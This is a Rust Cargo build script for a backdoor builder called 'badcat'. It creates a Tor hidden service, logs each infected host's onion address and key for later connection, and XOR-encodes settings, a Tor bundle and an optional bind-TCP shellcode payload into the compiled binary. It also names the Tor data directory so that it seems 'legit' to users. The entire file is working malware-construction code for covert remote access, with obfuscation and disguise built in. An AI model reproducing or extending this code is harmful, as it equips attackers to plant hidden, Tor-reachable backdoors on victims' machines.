use std::io::Read;
use std::path::PathBuf;
use std::{collections, env, error, fs, io};

use badcat_lib::{secrets, xor};
use json::JsonValue;
use tor::HiddenService;

const CFG_TEMPLATE: &str = "config.rs.template";
const CFG_DESTINATION: &str = "src/config.rs";
const CFG_SETTINGS: &str = "settings.json";

struct BuildSetting {
    /// Name to identify the host when connecting to it later
    name: String,

    /// Which file to save information about
    hosts_file: PathBuf,

    /// XOR encryption key
    key: String,

    /// Name of the Tor data directory. Generally one want to set
    /// this name to something that users seems to be legit.
    spoof_dir: String,

    /// Torrc file to bundle
    torrc_file: PathBuf,

    /// Whether or not to use shellcode like payload
    uses_payload: bool,

    /// Payload to file to bundle. The executable might start a tcp server
    payload_file: PathBuf,

    /// If using a bind_tcp payload, what port the payload will listen
    payload_port: String,
}

fn main() -> Result<(), Box<dyn error::Error>> {
    println!("cargo:rerun-if-changed=src/");

    let raw_settings: JsonValue = load_settings()?;

    let setting = parse_settings(&raw_settings);

    println!("cargo:rerun-if-changed={}", CFG_SETTINGS);
    println!(
        "cargo:rerun-if-changed={}",
        setting.torrc_file.to_str().unwrap()
    );

    if setting.uses_payload {
        println!(
            "cargo:rerun-if-changed={}",
            setting.payload_file.to_str().unwrap()
        );
    }

    let mut replacements = collections::HashMap::new();

    replacements.insert("@{ENC_KEY}", setting.key.clone());
    replacements.insert("@{ENC_DATA}", encode_data(&setting));
    replacements.insert("@{ENC_BUNDLE}", encode_bundle(&setting)?);
    replacements.insert("@{ENC_PAYLOAD}", encode_payload(&setting)?);

    replace_settings(CFG_TEMPLATE, CFG_DESTINATION, &replacements)?;

    Ok(())
}

/// Generate a tar archive with hidden service information and encode with XOR
fn encode_bundle(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
    let dir = tempfile::tempdir()?;

    let hs = HiddenService::new()?;
    hs.to_fs(dir.path().to_path_buf())?;

    add_host(hs.hostname, &setting)?;

    let mut buf = Vec::<u8>::new();

    {
        let mut archive = tar::Builder::new(&mut buf);
        archive.append_dir_all(".", &dir)?;
    }

    let enc_bundle = xor::encode_bytes(&setting.key, &buf);

    Ok(enc_bundle)
}

/// Create a json object with settings for the backdoor and encode with XOR
fn encode_data(setting: &BuildSetting) -> String {
    let mut data = JsonValue::new_object();

    data["uses_payload"] = setting.uses_payload.into();
    data["payload_port"] = setting.payload_port.clone().into();

    let mut torrc = fs::read_to_string(&setting.torrc_file).expect("problem reading torrc file");

    if setting.uses_payload {
        // add a hidden service for the payload
        torrc += &format!(
            "\nHiddenServicePort {} 127.0.0.1:{}\n",
            &setting.payload_port, &setting.payload_port
        );
    }

    data["tor_dir"] = setting.spoof_dir.clone().into();
    data["torrc"] = torrc.into();

    xor::encode(&setting.key, &json::stringify(data))
}

/// Read the payload file and encode with XOR
fn encode_payload(setting: &BuildSetting) -> io::Result<String> {
    let payload = if setting.uses_payload {
        let mut file = fs::File::open(&setting.payload_file).expect("problem reading payload file");

        let mut buf = Vec::new();
        file.read_to_end(&mut buf)?;

        buf
    } else {
        Vec::new()
    };

    Ok(xor::encode_bytes(&setting.key, &payload))
}

/// Add address to hosts file.
fn add_host(address: String, setting: &BuildSetting) -> Result<(), Box<dyn error::Error>> {
    let mut hosts = match fs::read_to_string(&setting.hosts_file) {
        Ok(data) => json::parse(&data).expect(&format!(
            "failed to read json at {}",
            &setting.hosts_file.to_str().unwrap()
        )),
        Err(_) => json::JsonValue::new_array(),
    };

    let mut host = json::JsonValue::new_object();

    host["address"] = address.into();
    host["uses_payload"] = setting.uses_payload.into();
    host["payload_port"] = setting.payload_port.clone().into();
    host["name"] = setting.name.clone().into();
    host["key"] = setting.key.clone().into();

    hosts.push(host)?;

    fs::write(&setting.hosts_file, hosts.pretty(4))?;

    Ok(())
}

/// Read the default settings file and parse into a json object.
fn load_settings() -> json::Result<json::JsonValue> {
    let source = fs::read_to_string(CFG_SETTINGS).expect("failed to read settings");
    json::parse(&source)
}

/// Replace every ocorrence from `template` into `destination`.
fn replace_settings(
    template: &str,
    destination: &str,
    replacements: &collections::HashMap<&str, String>,
) -> io::Result<()> {
    let mut config_source = fs::read_to_string(template)?;

    for (pattern, content) in replacements {
        config_source = config_source.replace(pattern, &content);
    }

    fs::write(destination, config_source)
}

fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
    let target = env::var("TARGET").unwrap_or(String::new());
    let is_tor_for_windows = target.eq("x86_64-pc-windows-gnu");

    let name = String::from(raw["name"].as_str().unwrap_or_else(|| {
        panic!("invalid name setting");
    }));

    let hosts_file = PathBuf::from(raw["hosts_file"].as_str().unwrap_or_else(|| {
        panic!("invalid hosts_file setting");
    }));

    let key = if raw.has_key("key") {
        String::from(raw["key"].as_str().unwrap_or_else(|| {
            panic!("key must be a string");
        }))
    } else {
        secrets::new_key(64)
    };

    let spoof_dir = if is_tor_for_windows {
        String::from(
            raw["tor"]["spoof_dir"]["windows"]
                .as_str()
                .unwrap_or_else(|| {
                    panic!("invalid windows download directory");
                }),
        )
    } else {
        String::from(
            raw["tor"]["spoof_dir"]["linux"]
                .as_str()
                .unwrap_or_else(|| {
                    panic!("invalid linux destination directory");
                }),
        )
    };

    let torrc_file = PathBuf::from(raw["tor"]["rc_file"].as_str().unwrap_or_else(|| {
        panic!("invalid torrc file");
    }));

    let uses_payload = raw["payload"]["enabled"].as_bool().unwrap_or(false);

    let payload_file = if uses_payload {
        PathBuf::from(
            raw["payload"]["file"]
                .as_str()
                .unwrap_or_else(|| panic!("invalid payload setting")),
        )
    } else {
        PathBuf::from("")
    };

    let payload_port = String::from(raw["payload"]["bind_port"].as_str().unwrap_or(""));

    if payload_port.is_empty() {
        panic!("payload port is required");
    }

    BuildSetting {
        name,
        hosts_file,
        key,
        spoof_dir,
        torrc_file,
        uses_payload,
        payload_file,
        payload_port,
    }
}
